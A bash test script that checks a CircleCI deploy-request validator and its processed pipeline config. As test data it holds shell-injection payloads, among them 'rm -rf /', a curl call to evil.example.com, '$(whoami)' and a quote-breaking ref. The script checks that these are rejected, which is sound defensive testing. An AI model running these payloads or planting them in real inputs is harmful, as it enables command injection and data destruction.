#!/usr/bin/env bash

set -euo pipefail

ROOT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)
VALIDATOR="${ROOT_DIR}/.circleci/scripts/validate-deploy-request.sh"
CONFIG_ASSERTIONS="${ROOT_DIR}/.circleci/tests/assert_processed_config.py"

fail() {
  echo "FAIL: $*" >&2
  exit 1
}

expect_success() {
  local description=$1
  shift

  "$@" || fail "${description}"
}

# Negative cases must exit with status exactly 1 and print a matching error.
expect_rejected() {
  local description=$1
  local expected_error=$2
  shift 2

  local output status
  set +e
  output=$("$@" 2>&1)
  status=$?
  set -e

  if [[ ${status} -ne 1 ]]; then
    fail "${description}: expected exit status 1, got ${status} (output: ${output})"
  fi
  if ! grep -Fq -- "${expected_error}" <<<"${output}"; then
    fail "${description}: expected error containing '${expected_error}', got: ${output}"
  fi
}

assert_contains() {
  local file=$1
  local expected=$2

  grep -Fq -- "${expected}" "${file}" ||
    fail "expected ${file} to contain ${expected}"
}

assert_not_contains() {
  local file=$1
  local unexpected=$2

  if grep -Fq -- "${unexpected}" "${file}"; then
    fail "expected ${file} not to contain ${unexpected}"
  fi
}

expect_success "valid redeploy request was rejected" \
  "${VALIDATOR}" redeploy sha256:redeploy123
expect_success "valid rollback request was rejected" \
  "${VALIDATOR}" rollback sha256:rollback123
expect_success "valid registry-style artifact ref was rejected" \
  "${VALIDATOR}" redeploy "registry.example.com/bank/frontend@sha256:abc-123_v1.0"

expect_rejected "empty artifact_ref was accepted" \
  "artifact_ref must not be empty" \
  "${VALIDATOR}" redeploy ""
expect_rejected "unsupported deploy action was accepted" \
  "valid actions are: redeploy, rollback" \
  "${VALIDATOR}" promote sha256:promote123
expect_rejected "missing deploy action was accepted" \
  "valid actions are: redeploy, rollback" \
  "${VALIDATOR}"

INVALID_REF_ERROR="artifact_ref contains invalid characters"

# Malicious artifact refs: shell metacharacters, quotes and whitespace.
for malicious_ref in \
  'sha256:abc; rm -rf /' \
  'sha256:abc && curl http://evil.example.com' \
  'sha256:abc | tee /tmp/pwned' \
  '$(whoami)' \
  '`whoami`' \
  'sha256:abc$(id)' \
  'sha256:"abc"' \
  "sha256:'abc'" \
  'sha256:abc>out' \
  'sha256:abc<in' \
  'sha256:abc
rm -rf /' \
  'sha256:abc def' \
  '  ' \
  $'sha256:abc\ttab'; do
  expect_rejected "malicious artifact_ref was accepted: ${malicious_ref}" \
    "${INVALID_REF_ERROR}" \
    "${VALIDATOR}" redeploy "${malicious_ref}"
done

echo "PASS: deploy request validation"

TEMP_DIR=$(mktemp -d)
trap 'rm -rf "${TEMP_DIR}"' EXIT

MALICIOUS_REF='sha256:abc"; rm -rf / #'

cat > "${TEMP_DIR}/deploy-only-parameters.yml" <<YAML
deploy_only: true
deploy_action: rollback
artifact_ref: '${MALICIOUS_REF}'
YAML

circleci config process "${ROOT_DIR}/.circleci/config.yml" \
  > "${TEMP_DIR}/default-config.yml" ||
  fail "could not process config with default parameters"

circleci config process "${ROOT_DIR}/.circleci/config.yml" \
  --pipeline-parameters "${TEMP_DIR}/deploy-only-parameters.yml" \
  > "${TEMP_DIR}/deploy-only-config.yml" ||
  fail "could not process config with deploy-only parameters"

assert_contains "${TEMP_DIR}/default-config.yml" "java-test-and-code-cov"
assert_not_contains "${TEMP_DIR}/default-config.yml" "validate-deploy-request"
assert_not_contains "${TEMP_DIR}/deploy-only-config.yml" "java-test-and-code-cov"

python3 "${CONFIG_ASSERTIONS}" \
  "${TEMP_DIR}/deploy-only-config.yml" \
  "${TEMP_DIR}/default-config.yml" \
  "${MALICIOUS_REF}" ||
  fail "processed config safety assertions failed"

echo "PASS: deploy-only workflow selection"
